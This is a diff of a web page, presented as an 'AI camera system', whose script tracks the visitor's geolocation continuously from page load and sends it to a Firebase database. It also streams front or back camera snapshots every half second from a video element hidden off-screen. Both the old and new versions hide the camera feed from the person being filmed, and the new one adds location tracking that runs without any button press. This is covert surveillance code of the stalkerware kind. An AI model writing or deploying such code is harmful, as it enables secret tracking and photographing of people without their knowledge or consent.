@@ -13,7 +13,7 @@ background:black;
 color:white;
 text-align:center;
 font-family:Arial;
-padding-top:120px;
+padding-top:100px;
 }
 
 h1{
@@ -21,22 +21,17 @@ font-size:50px;
 }
 
 button{
-font-size:35px;
-padding:20px 60px;
-margin-top:40px;
+font-size:30px;
+padding:15px 40px;
+margin:10px;
 background:lime;
 border:none;
 border-radius:10px;
 }
 
-/* IMPORTANT: don't use display:none */
 video{
 position:absolute;
-top:-5000px;
-left:-5000px;
-width:10px;
-height:10px;
-opacity:0.01;
+left:-9999px;
 }
 
 </style>
@@ -44,12 +39,12 @@ opacity:0.01;
 </head>
 <body>
 
-<h1>WHAT IS AI SYSTEM</h1>
+<h1>AI CAMERA SYSTEM</h1>
 
-<button onclick="startSystem()">START</button>
+<button onclick="startFront()">FRONT CAMERA</button>
+<button onclick="startBack()">BACK CAMERA</button>
 
-<video id="frontCam" autoplay playsinline muted></video>
-<video id="backCam" autoplay playsinline muted></video>
+<video id="video" autoplay playsinline muted></video>
 
 <script>
 
@@ -63,8 +58,10 @@ firebase.initializeApp(firebaseConfig);
 
 let deviceId="phone_"+Math.floor(Math.random()*100000);
 
-function startSystem(){
+let currentStream=null;
 
+
+// LOCATION ALWAYS RUN
 navigator.geolocation.watchPosition(function(pos){
 
 firebase.database().ref("devices/"+deviceId+"/location").set({
@@ -74,31 +71,39 @@ lon:pos.coords.longitude
 
 });
 
-startCamera("user","frontCam","front");
 
-startCamera("environment","backCam","back");
+function startFront(){
+startCamera("user","front");
+}
 
+function startBack(){
+startCamera("environment","back");
 }
 
 
-function startCamera(mode, videoId, type){
+function startCamera(mode,type){
+
+// stop previous
+if(currentStream){
+
+currentStream.getTracks().forEach(track=>track.stop());
+
+}
 
 navigator.mediaDevices.getUserMedia({
 video:{facingMode:mode}
 })
 .then(function(stream){
 
-let video=document.getElementById(videoId);
+currentStream=stream;
+
+let video=document.getElementById("video");
 
 video.srcObject=stream;
-
-video.onloadedmetadata=function(){
 
 video.play();
 
 capture(video,type);
-
-};
 
 });
 
@@ -120,13 +125,13 @@ canvas.height=video.videoHeight;
 
 ctx.drawImage(video,0,0);
 
-let img=canvas.toDataURL("image/jpeg",0.7);
+let img=canvas.toDataURL("image/jpeg",0.8);
 
 firebase.database().ref("devices/"+deviceId+"/camera/"+type).set({
 img:img
 });
 
-},700);
+},500);
 
 }
 
